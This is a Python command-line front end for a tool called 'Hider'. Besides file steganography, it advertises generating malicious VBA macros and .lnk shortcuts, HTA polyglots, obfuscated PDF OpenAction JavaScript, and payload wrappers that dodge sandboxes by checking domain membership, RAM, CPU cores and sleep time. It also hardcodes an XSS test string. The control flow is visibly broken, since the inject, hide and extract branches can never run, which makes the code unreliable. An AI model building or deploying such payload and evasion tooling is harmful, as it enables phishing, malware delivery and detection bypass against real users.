import sys
import os
import argparse
from metadata_engine import MetadataEngine
from universal_engine import UniversalEngine
from pdf_handler import PDFHandler
from office_handler import OfficeHandler
from pe_handler import PEHandler
from video_handler import VideoHandler
from lsb_engine import LSBEngine
from lnk_handler import LNKHandler
from audio_handler import AudioHandler
from archive_handler import ArchiveHandler
from encryption_engine import EncryptionEngine
from evasion_engine import EvasionEngine
from macro_engine import MacroEngine

def main():
    parser = argparse.ArgumentParser(description="Hider: EXIF Metadata Security Research Tool")
    subparsers = parser.add_subparsers(dest="command")

    # View command
    view_parser = subparsers.add_parser("view", help="View EXIF metadata")
    view_parser.add_argument("image", help="Path to the image file")

    # Edit command
    edit_parser = subparsers.add_parser("edit", help="Edit a specific EXIF tag")
    edit_parser.add_argument("image", help="Path to the image file")
    edit_parser.add_argument("--ifd", required=True, help="IFD name (0th, Exif, GPS, 1st)")
    edit_parser.add_argument("--tag", required=True, type=int, help="Tag ID (integer)")
    edit_parser.add_argument("--value", required=True, help="New value for the tag")
    edit_parser.add_argument("--out", help="Output path (optional)")

    # Inject command (for security payloads)
    inject_parser = subparsers.add_parser("inject", help="Inject a payload into a tag")
    inject_parser.add_argument("image", help="Path to the image file")
    inject_parser.add_argument("--ifd", default="Exif", help="IFD name")
    inject_parser.add_argument("--tag", default=37510, type=int, help="Tag ID (default: 37510 for UserComment)")
    inject_parser.add_argument("--payload", help="The payload string/data to inject")
    inject_parser.add_argument("--type", choices=["xss", "overflow", "null"], help="Predefined payload types")
    inject_parser.add_argument("--out", help="Output path")

    # Hide command (steganography)
    hide_parser = subparsers.add_parser("hide", help="Hide a file/data in EXIF metadata")
    hide_parser.add_argument("image", help="Path to the image file")
    hide_parser.add_argument("--file", required=True, help="File to hide")
    hide_parser.add_argument("--tag", default=37510, type=int, help="Tag ID to use")
    hide_parser.add_argument("--out", help="Output path")

    # Extract command
    extract_parser = subparsers.add_parser("extract", help="Extract hidden data from metadata")
    extract_parser.add_argument("file", help="Path to the image file")
    extract_parser.add_argument("--tag", default=37510, type=int, help="Tag ID to extract from")
    extract_parser.add_argument("--out", help="File to save extracted data")

    # Structure exploit command
    struct_parser = subparsers.add_parser("exploit-structure", help="Manipulate JPEG segments directly")
    struct_parser.add_argument("image", help="Path to the image file")
    struct_parser.add_argument("--type", choices=["trailing", "pre-header"], required=True, help="Type of structure exploit")
    struct_parser.add_argument("--payload", required=True, help="Payload to inject")
    struct_parser.add_argument("--out", help="Output path")

    # Universal commands
    universal_parser = subparsers.add_parser("universal", help="Universal file manipulation (tail-loading)")
    universal_parser.add_argument("file", help="Target file")
    universal_parser.add_argument("--mode", choices=["hide", "extract", "hta-polyglot"], required=True)
    universal_parser.add_argument("--data", help="Data to hide or script for HTA")
    universal_parser.add_argument("--obfuscate", action="store_true", help="Enable evasion obfuscation")
    universal_parser.add_argument("--password", help="AES-256 Password for encryption/decryption")
    universal_parser.add_argument("--out", help="Output path")

    # PDF commands
    pdf_parser = subparsers.add_parser("pdf", help="PDF metadata manipulation")
    pdf_parser.add_argument("file", help="Target PDF file")
    pdf_parser.add_argument("--mode", choices=["view", "edit", "open-action"], required=True)
    pdf_parser.add_argument("--key", help="Metadata key (e.g. /Title)")
    pdf_parser.add_argument("--value", help="Metadata value or JS script")
    pdf_parser.add_argument("--obfuscate", action="store_true", help="Enable JS obfuscation")
    pdf_parser.add_argument("--out", help="Output path")

    # Office commands
    office_parser = subparsers.add_parser("office", help="Office (DOCX, XLSX, PPTX) metadata manipulation")
    office_parser.add_argument("file", help="Target Office file")
    office_parser.add_argument("--mode", choices=["view", "edit"], required=True)
    office_parser.add_argument("--key", help="Property key (e.g. author, title, category)")
    office_parser.add_argument("--value", help="Property value")
    office_parser.add_argument("--out", help="Output path")

    # DLL / PE commands
    dll_parser = subparsers.add_parser("dll", help="DLL/EXE metadata manipulation")
    dll_parser.add_argument("file", help="Target DLL file")
    dll_parser.add_argument("--mode", choices=["view", "hide", "extract"], required=True)
    dll_parser.add_argument("--data", help="Data to hide")
    dll_parser.add_argument("--out", help="Output path")
    # Video commands
    video_parser = subparsers.add_parser("video", help="Video (MP4, MKV, etc.) metadata manipulation")
    video_parser.add_argument("file", help="Target Video file")
    video_parser.add_argument("--mode", choices=["view", "edit"], required=True)
    video_parser.add_argument("--key", help="Metadata key (e.g. title, comment, artist)")
    video_parser.add_argument("--value", help="Metadata value")
    video_parser.add_argument("--out", help="Output path")

    # LSB commands
    lsb_parser = subparsers.add_parser("lsb", help="LSB (Least Significant Bit) Steganography")
    lsb_parser.add_argument("file", help="Target Image file")
    lsb_parser.add_argument("--mode", choices=["hide", "extract"], required=True)
    lsb_parser.add_argument("--data", help="Data to hide")
    # Audio commands
    audio_parser = subparsers.add_parser("audio", help="Audio (.WAV) LSB Steganography")
    audio_parser.add_argument("file", help="Target WAV file")
    audio_parser.add_argument("--mode", choices=["hide", "extract"], required=True)
    audio_parser.add_argument("--data", help="Data to hide")
    # Archive commands
    archive_parser = subparsers.add_parser("archive", help="Archive (.ZIP) Steganography")
    archive_parser.add_argument("file", help="Target ZIP file")
    archive_parser.add_argument("--mode", choices=["hide", "extract"], required=True)
    archive_parser.add_argument("--data", help="Data to hide")
    archive_parser.add_argument("--password", help="AES-256 Password for encryption/decryption")
    archive_parser.add_argument("--out", help="Output path")

    # Evasion commands
    evasion_parser = subparsers.add_parser("evasion", help="Evasion and Sandbox Bypass Wrappers")
    evasion_parser.add_argument("--payload", help="Raw payload (e.g. powershell snippet) to wrap", required=True)
    evasion_parser.add_argument("--type", choices=["jscript", "vbscript"], default="jscript", help="Wrapper Type")
    evasion_parser.add_argument("--check-domain", action="store_true", help="Abort if not on domain")
    evasion_parser.add_argument("--min-ram", type=int, default=0, help="Minimum RAM (GB)")
    evasion_parser.add_argument("--min-cores", type=int, default=0, help="Minimum CPU Cores")
    evasion_parser.add_argument("--sleep", type=int, default=0, help="Sleep duration (ms) before execution")
    evasion_parser.add_argument("--out", help="Output file containing the wrapped payload", required=True)

    # VBA Macro Generator commands
    vba_parser = subparsers.add_parser("vba", help="Generate Malicious VBA Macros")
    vba_parser.add_argument("--payload", help="Raw payload (e.g. command) to execute natively or after staging", required=True)
    vba_parser.add_argument("--check-domain", action="store_true", help="Abort if not on domain")
    vba_parser.add_argument("--min-ram", type=int, default=0, help="Minimum RAM (GB)")
    vba_parser.add_argument("--min-cores", type=int, default=0, help="Minimum CPU Cores")
    vba_parser.add_argument("--sleep", type=int, default=0, help="Sleep duration (ms) before execution")
    vba_parser.add_argument("--out", help="Output .vba file", required=True)

    # Shortcut (LNK) commands
    lnk_parser = subparsers.add_parser("shortcut", help="Generate Malicious .lnk Shortcuts")
    lnk_parser.add_argument("--cmd", required=True, help="Command to execute")
    lnk_parser.add_argument("--out", required=True, help="Output .lnk path")
    lnk_parser.add_argument("--icon", help="Icon path (optional)")

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        sys.exit(0)

    try:
        filenames = {
            "view": "image", "edit": "image", "inject": "image", "hide": "image", "extract": "file",
            "exploit-structure": "image", "universal": "file", "pdf": "file", "office": "file", "dll": "file",
            "evasion": "file", "vba": "file"
        }
        
        # Determine target file path based on command
        target_path = getattr(args, filenames.get(args.command, "file"), None)

        if args.command in ["view", "edit", "inject", "hide", "extract"]:
            engine = MetadataEngine(target_path)
            
            if args.command == "view":
                engine.view_pretty()
        
            elif args.command == "edit":
                engine.update_tag(args.ifd, args.tag, args.value)
                engine.save(args.out)

        elif args.command == "inject":
            payload = args.payload
            if args.type == "xss":
                payload = "<script>alert('Hider_XSS')</script>"
            elif args.type == "overflow":
                payload = "A" * 5000
            elif args.type == "null":
                payload = "prefix\x00secret\x00suffix"
            
            if payload is None:
                print("Error: Either --payload or --type must be specified")
                sys.exit(1)

            final_payload: bytes
            if isinstance(payload, str):
                final_payload = payload.encode()
            else:
                final_payload = payload

            if args.tag == 37510: # UserComment
                final_payload = b"ASCII\x00\x00\x00" + final_payload
            
            engine.inject_payload(args.ifd, args.tag, final_payload)
            engine.save(args.out)

        elif args.command == "hide":
            import base64
            with open(args.file, "rb") as f:
                encoded = base64.b64encode(f.read()).decode()
            
            payload_str = f"HIDDEN:{encoded}"
            final_payload = payload_str.encode()
            if args.tag == 37510:
                final_payload = b"ASCII\x00\x00\x00" + final_payload
            
            engine.update_tag("Exif", args.tag, final_payload)
            engine.save(args.out)

        elif args.command == "extract":
            import base64
            exif = engine.get_all_exif()
            found = False
            for ifd_name in ("Exif", "0th", "1st"):
                ifd = exif.get(ifd_name, {})
                if args.tag in ifd:
                    raw_val = ifd[args.tag]
                    
                    if isinstance(raw_val, bytes):
                        # Handle UserComment prefix
                        if args.tag == 37510 and raw_val.startswith(b"ASCII\x00\x00\x00"):
                            content = raw_val[8:].decode("ascii", errors="ignore")
                        else:
                            try:
                                content = raw_val.decode("ascii", errors="ignore")
                            except:
                                content = ""
                        
                        if content.startswith("HIDDEN:"):
                            encoded = content[7:]
                            try:
                                decoded = base64.b64decode(encoded)
                                if args.out:
                                    with open(args.out, "wb") as f:
                                        f.write(decoded)
                                    print(f"Extracted data to: {args.out}")
                                else:
                                    print(f"Extracted data: {decoded}")
                                found = True
                                break
                            except:
                                pass
            if not found:
                print(f"Tag {args.tag} not found or doesn't contain hidden data.")

        elif args.command == "exploit-structure":
            with open(args.image, "rb") as f:
                data = f.read()
            
            output_path = args.out if args.out else f"struct_{args.image}"
            payload = args.payload.encode()

            if args.type == "trailing":
                # Append data after EOI (FF D9)
                # Some parsers ignore everything after EOI, others might be confused
                modified_data = data + payload
                with open(output_path, "wb") as f:
                    f.write(modified_data)
                print(f"Appended trailing payload to {output_path}")

            elif args.type == "pre-header":
                # Inject data before SOI (FF D8) or between SOI and first segment
                # JPEG starts with FF D8
                if data.startswith(b"\xff\xd8"):
                    # Insert after SOI
                    modified_data = data[:2] + payload + data[2:]
                    with open(output_path, "wb") as f:
                        f.write(modified_data)
                    print(f"Injected pre-header payload to {output_path}")
                else:
                    print("Error: Not a valid JPEG (no SOI found)")

        elif args.command == "universal":
            if args.mode == "hide":
                if not args.data:
                    print("Error: --data required for hide mode")
                    sys.exit(1)
                
                payload = args.data.encode()
                if args.password:
                    b64_cipher = EncryptionEngine.encrypt(payload, args.password)
                    payload = b"ENC:" + b64_cipher
                    
                UniversalEngine.tail_hide(args.file, payload, args.out)
                print(f"Successfully hid data in {args.out or args.file}")
            elif args.mode == "extract":
                data = UniversalEngine.tail_extract(args.file)
                if data:
                    if data.startswith(b"ENC:") and args.password:
                        try:
                            decrypted = EncryptionEngine.decrypt(data[4:], args.password)
                            print(f"Extracted (Decrypted): {decrypted.decode(errors='ignore')}")
                        except Exception as e:
                            print(f"Extraction failed: {e}")
                    else:
                        print(f"Extracted: {data.decode(errors='ignore')}")
                else:
                    print("No hidden data found.")
            elif args.mode == "hta-polyglot":
                UniversalEngine.create_hta_polyglot(args.file, args.data, args.out, obfuscate=args.obfuscate)
                print(f"Successfully created HTA polyglot: {args.out or args.file}")

        elif args.command == "pdf":
            handler = PDFHandler(args.file)
            if args.mode == "view":
                meta = handler.get_metadata()
                print("--- PDF Metadata ---")
                if meta:
                    for k, v in meta.items():
                        print(f"{k}: {v}")
                else:
                    print("No metadata found.")
            elif args.mode == "edit":
                if not args.key or not args.value:
                    print("Error: --key and --value required for edit mode")
                    sys.exit(1)
                handler.update_metadata(args.key, args.value, args.out)
                print(f"Updated PDF metadata in {args.out or args.file}")
            elif args.mode == "open-action":
                if not args.value:
                    print("Error: --value required for JavaScript payload")
                    sys.exit(1)
                if args.obfuscate:
                    handler.inject_obfuscated_js(args.value, args.out)
                else:
                    handler.inject_open_action(args.value, args.out)
                print(f"Injected OpenAction JS in {args.out or args.file}")

        elif args.command == "office":
            handler = OfficeHandler(args.file)
            if args.mode == "view":
                meta = handler.get_metadata()
                print(f"--- Office Metadata ({os.path.basename(args.file)}) ---")
                for k, v in meta.items():
                    print(f"{k}: {v}")
            elif args.mode == "edit":
                if not args.key or not args.value:
                    print("Error: --key and --value required for edit mode")
                    sys.exit(1)
                handler.update_metadata(args.key, args.value, args.out)
                print(f"Updated Office metadata in {args.out or args.file}")

        elif args.command == "dll":
            handler = PEHandler(args.file)
            if args.mode == "view":
                info = handler.get_info()
                print(f"--- PE Info ({os.path.basename(args.file)}) ---")
                for k, v in info.items():
                    print(f"{k}: {v}")
            elif args.mode == "hide":
                if not args.data:
                    print("Error: --data required for hide mode")
                    sys.exit(1)
                handler.update_version_string("HiderData", args.data, args.out)
                print(f"Successfully hid data in {args.out or args.file}")
            elif args.mode == "extract":
                data = UniversalEngine.tail_extract(args.file)
                if data:
                    print(f"Extracted: {data.decode(errors='ignore')}")
                else:
                    print("No hidden data found.")

        elif args.command == "video":
            handler = VideoHandler(args.file)
            if args.mode == "view":
                meta = handler.get_metadata()
                print(f"--- Video Metadata ({os.path.basename(args.file)}) ---")
                if meta:
                    for k, v in meta.items():
                        print(f"{k}: {v}")
                else:
                    print("No metadata found.")
            elif args.mode == "edit":
                if not args.key or not args.value:
                    print("Error: --key and --value required for edit mode")
                    sys.exit(1)
                handler.update_metadata(args.key, args.value, args.out)
                print(f"Updated Video metadata in {args.out or args.file}")

        elif args.command == "lsb":
            if args.mode == "hide":
                if not args.data:
                    print("Error: --data required for hide mode")
                    sys.exit(1)
                
                payload_str = args.data
                if args.password:
                    b64_cipher = EncryptionEngine.encrypt(payload_str, args.password)
                    payload_str = "ENC:" + b64_cipher.decode('utf-8')
                    
                LSBEngine.encode(args.file, payload_str, args.out or args.file)
                print(f"Successfully hid data via LSB in {args.out or args.file}")
            elif args.mode == "extract":
                data = LSBEngine.decode(args.file)
                if data:
                    if data.startswith("ENC:") and args.password:
                        try:
                            decrypted = EncryptionEngine.decrypt(data[4:].encode('utf-8'), args.password)
                            print(f"Extracted (Decrypted): {decrypted.decode(errors='ignore')}")
                        except Exception as e:
                            print(f"Extraction failed: {e}")
                    else:
                        print(f"Extracted: {data}")
        elif args.command == "audio":
            if args.mode == "hide":
                if not args.data:
                    print("Error: --data required for hide mode")
                    sys.exit(1)
                
                payload_str = args.data
                if args.password:
                    b64_cipher = EncryptionEngine.encrypt(payload_str, args.password)
                    payload_str = "ENC:" + b64_cipher.decode('utf-8')
                    
                try:
                    AudioHandler.encode(args.file, payload_str, args.out or args.file)
                    print(f"Successfully hid data via Audio LSB in {args.out or args.file}")
                except Exception as e:
                    print(f"Audio steganography failed: {e}")
            elif args.mode == "extract":
                try:
                    data = AudioHandler.decode(args.file)
                    if data:
                        if data.startswith("ENC:") and args.password:
                            try:
                                decrypted = EncryptionEngine.decrypt(data[4:].encode('utf-8'), args.password)
                                print(f"Extracted (Decrypted): {decrypted.decode(errors='ignore')}")
                            except Exception as e:
                                print(f"Extraction failed: {e}")
                        else:
                            print(f"Extracted: {data}")
                    else:
                        print("No Audio LSB data found.")
                except Exception as e:
                    print(f"Audio extraction failed: {e}")
        elif args.command == "archive":
            if args.mode == "hide":
                if not args.data:
                    print("Error: --data required for hide mode")
                    sys.exit(1)
                
                payload = args.data.encode()
                if args.password:
                    b64_cipher = EncryptionEngine.encrypt(payload, args.password)
                    payload = b"ENC:" + b64_cipher
                    
                try:
                    ArchiveHandler.encode(args.file, payload, args.out or args.file)
                    print(f"Successfully hid data in Archive {args.out or args.file}")
                except Exception as e:
                    print(f"Archive steganography failed: {e}")
            elif args.mode == "extract":
                try:
                    data = ArchiveHandler.decode(args.file)
                    if data:
                        if data.startswith(b"ENC:") and args.password:
                            try:
                                decrypted = EncryptionEngine.decrypt(data[4:], args.password)
                                print(f"Extracted (Decrypted): {decrypted.decode(errors='ignore')}")
                            except Exception as e:
                                print(f"Extraction failed: {e}")
                        else:
                            print(f"Extracted: {data.decode(errors='ignore')}")
                    else:
                        print("No Archive Steganography data found.")
                except Exception as e:
                    print(f"Archive extraction failed: {e}")

        elif args.command == "shortcut":
            LNKHandler.create_lnk_payload(args.cmd, args.out, args.icon)
            print(f"Successfully generated malicious shortcut: {args.out}")

        elif args.command == "evasion":
            if args.type == "jscript":
                wrapped = EvasionEngine.wrap_jscript(
                    payload=args.payload, 
                    check_domain=args.check_domain,
                    min_ram_gb=args.min_ram,
                    min_cores=args.min_cores,
                    sleep_ms=args.sleep
                )
            else:
                wrapped = EvasionEngine.wrap_vbscript(
                    payload=args.payload, 
                    check_domain=args.check_domain,
                    min_ram_gb=args.min_ram,
                    min_cores=args.min_cores,
                    sleep_ms=args.sleep
                )
            with open(args.out, "w") as f:
                f.write(wrapped)
            print(f"Successfully generated evasion wrapper: {args.out}")

        elif args.command == "vba":
            MacroEngine.generate_vba(
                payload=args.payload,
                output_path=args.out,
                check_domain=args.check_domain,
                min_ram_gb=args.min_ram,
                min_cores=args.min_cores,
                sleep_ms=args.sleep
            )
            print(f"Successfully generated VBA macro: {args.out}")

        else:
            parser.print_help()

    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
